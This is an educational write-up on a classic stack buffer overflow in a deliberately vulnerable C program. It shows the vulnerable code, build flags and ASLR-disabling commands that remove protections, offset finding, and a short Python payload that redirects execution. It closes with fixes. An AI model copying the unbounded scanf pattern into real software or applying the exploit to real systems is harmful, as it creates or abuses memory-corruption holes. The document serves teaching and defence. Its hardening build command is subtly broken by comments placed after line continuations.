# Simple Buffer Overflow Example

## Overview

This is a beginner-friendly buffer overflow example that demonstrates the fundamental vulnerability. The program accepts user input without bounds checking, allowing attackers to overwrite memory and potentially execute arbitrary code.

## The Vulnerable Program

```c
#include <stdio.h>

void secretFunction()
{
    printf("Omar's Crappy Function\n");
    printf("This is a super secret function!\n");
}

void echo()
{
    char buffer[20];

    printf("Please enter your name below:\n");
    scanf("%s", buffer);
    printf("You entered: %s\n", buffer);    
}

int main()
{
    echo();

    return 0;
}
```

## What Makes This Vulnerable?

### The Problem
```c
char buffer[20];
scanf("%s", buffer);
```

1. **No Bounds Checking**: `scanf("%s")` reads input until it encounters whitespace, regardless of buffer size
2. **Fixed Buffer Size**: The buffer can only hold 20 bytes (including null terminator)
3. **Stack Allocation**: The buffer is on the stack, near critical control data

### What Can Go Wrong?

**Input: "Alice"** (5 bytes + null terminator)
- ✅ Works fine - within buffer limits

**Input: 30 'A' characters**
- ❌ Overflows buffer by 10 bytes
- ❌ Overwrites adjacent stack memory
- ❌ May crash the program

**Input: Carefully crafted 32 bytes + address**
- ❌ Overflows buffer completely
- ❌ Overwrites saved return address
- ❌ Can redirect execution to `secretFunction()` or arbitrary code

## Learning Objectives

After completing this example, you will understand:
1. How `scanf()` without size limits causes buffer overflows
2. How to identify the vulnerable pattern in code
3. How buffer overflows can crash programs
4. How overflows can redirect program execution
5. The basics of stack layout and return address overwriting

## Compilation

### For 32-bit Systems (Easier to Exploit)
```bash
# Compile with protections disabled for learning
gcc vuln.c -o vuln -fno-stack-protector -z execstack -m32

# Flags explained:
# -fno-stack-protector : Disables stack canaries
# -z execstack         : Makes stack executable
# -m32                 : Compiles as 32-bit binary
```

### For 64-bit Systems
```bash
# Install 32-bit libraries first (if needed)
sudo apt-get install gcc-multilib

# Then compile
gcc vuln.c -o vuln -fno-stack-protector -z execstack -m32
```

## Running the Example

### Normal Usage
```bash
$ ./vuln
Please enter your name below:
Alice
You entered: Alice
```

### Triggering a Crash
```bash
# Generate 50 'A' characters
$ python3 -c "print('A' * 50)" | ./vuln
Please enter your name below:
You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```

**What happened?**
- The 50 bytes overflowed the 20-byte buffer
- Adjacent stack memory was overwritten
- The saved return address was corrupted
- Program tried to return to an invalid address
- **Result**: Segmentation fault

## Stack Layout Analysis

### Before `scanf()` Call

```
High Memory
┌─────────────────────┐
│  Return Address     │ ← Points back to main()
├─────────────────────┤
│  Saved EBP          │ ← Saved frame pointer
├─────────────────────┤
│  buffer[16-19]      │
├─────────────────────┤
│  buffer[12-15]      │
├─────────────────────┤
│  buffer[8-11]       │
├─────────────────────┤
│  buffer[4-7]        │
├─────────────────────┤
│  buffer[0-3]        │ ← ESP points here
└─────────────────────┘
Low Memory
```

### After Overflow with "AAAA...AAAA" (40 bytes)

```
High Memory
┌─────────────────────┐
│  Return Address     │ ← OVERWRITTEN! Now contains 0x41414141 ('AAAA')
├─────────────────────┤
│  Saved EBP          │ ← OVERWRITTEN! Now contains 0x41414141
├─────────────────────┤
│  buffer[16-19]      │ ← 'AAAA'
├─────────────────────┤
│  buffer[12-15]      │ ← 'AAAA'
├─────────────────────┤
│  buffer[8-11]       │ ← 'AAAA'
├─────────────────────┤
│  buffer[4-7]        │ ← 'AAAA'
├─────────────────────┤
│  buffer[0-3]        │ ← 'AAAA'
└─────────────────────┘
Low Memory
```

## Finding the Offset

To exploit this properly, we need to know the exact offset to the return address.

### Method 1: Using Pattern Generator

```bash
# Generate a unique pattern (from Metasploit or similar tool)
pattern_create -l 50

# Run the program with this pattern
echo "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab" | ./vuln

# Check the crashed instruction pointer in GDB
gdb ./vuln
(gdb) run < pattern.txt
(gdb) info registers eip

# Use pattern_offset to find the exact position
pattern_offset -q 0x41366141  # Example address from crash
```

### Method 2: Manual Testing

```bash
# Try different buffer sizes
python3 -c "print('A' * 20)" | ./vuln  # No crash
python3 -c "print('A' * 24)" | ./vuln  # No crash
python3 -c "print('A' * 28)" | ./vuln  # Might crash
python3 -c "print('A' * 32)" | ./vuln  # Likely crashes
```

## Exploitation Challenge

### Goal 1: Cause a Controlled Crash
Make the program crash by overflowing the buffer. ✅ Easy

### Goal 2: Call `secretFunction()`
Redirect execution to the `secretFunction()` without modifying the source code.

**Steps:**
1. Find the address of `secretFunction()`:
   ```bash
   objdump -d vuln | grep secretFunction
   # Or in GDB:
   gdb ./vuln
   (gdb) print secretFunction
   ```

2. Calculate the offset to the return address (typically 32 bytes in this example)

3. Craft payload:
   ```python
   import struct
   
   # Assume secretFunction is at 0x08048456
   secret_addr = struct.pack("<I", 0x08048456)  # Little-endian
   
   # Payload: 32 bytes padding + 4 bytes address
   payload = b"A" * 32 + secret_addr
   
   print(payload)
   ```

4. Execute:
   ```bash
   python3 exploit.py | ./vuln
   ```

### Goal 3: Execute Shellcode
Advanced: Inject and execute your own shellcode. See [Exploitation Techniques](../../exploitation/) for guidance.

## Common Mistakes & Troubleshooting

### "It doesn't crash!"
- Make sure stack protections are disabled: `-fno-stack-protector`
- Verify you're testing the correct binary
- Try increasing the input size

### "Address keeps changing!"
- ASLR (Address Space Layout Randomization) may be enabled
- Disable temporarily for learning:
  ```bash
  echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
  ```
- Re-enable after testing:
  ```bash
  echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
  ```

### "Wrong architecture!"
- Make sure you compiled with `-m32` for 32-bit
- Install multilib support if needed

## Defensive Measures

### How to Fix This Vulnerability

**Option 1: Limit input size**
```c
char buffer[20];
scanf("%19s", buffer);  // Read max 19 chars + null terminator
```

**Option 2: Use safer functions**
```c
char buffer[20];
fgets(buffer, sizeof(buffer), stdin);  // Includes size limit
```

**Option 3: Input validation**
```c
if (strlen(input) >= sizeof(buffer)) {
    fprintf(stderr, "Input too long!\n");
    return 1;
}
```

### Modern Protections

In production environments, enable all protections:
```bash
gcc vuln.c -o vuln_safe \
    -fstack-protector-strong \  # Enable stack canaries
    -D_FORTIFY_SOURCE=2 \        # Add runtime checks
    -O2 \                        # Enable optimizations
    -Wl,-z,relro \               # Read-only relocations
    -Wl,-z,now                   # Immediate binding
```

## Further Challenges

1. **Calculate the exact offset** using a pattern generator
2. **Redirect to secretFunction()** without source code access
3. **Write a working exploit script** that automates the attack
4. **Analyze in GDB** - observe the stack before and after overflow
5. **Enable protections one by one** and see how they prevent exploitation

## Next Steps

- Learn about [CPU Registers](../../basics/registers.md)
- Study [Assembly Basics](../../basics/assembly-basics.md)
- Practice [Calculating Offsets](../../exploitation/calculating-offsets.md)
- Try the [strcpy() Examples](../02-strcpy-examples/)

## References

- [Smashing the Stack for Fun and Profit](http://phrack.org/issues/49/14.html)
- [Buffer Overflow Exploitation](https://www.exploit-db.com/docs/english/28475-linux-stack-based-buffer-overflows.pdf)
- [GDB Cheat Sheet](https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf)

---

**⚠️ Security Reminder**: This example intentionally disables all security protections for educational purposes. Never deploy code with these protections disabled in production environments.

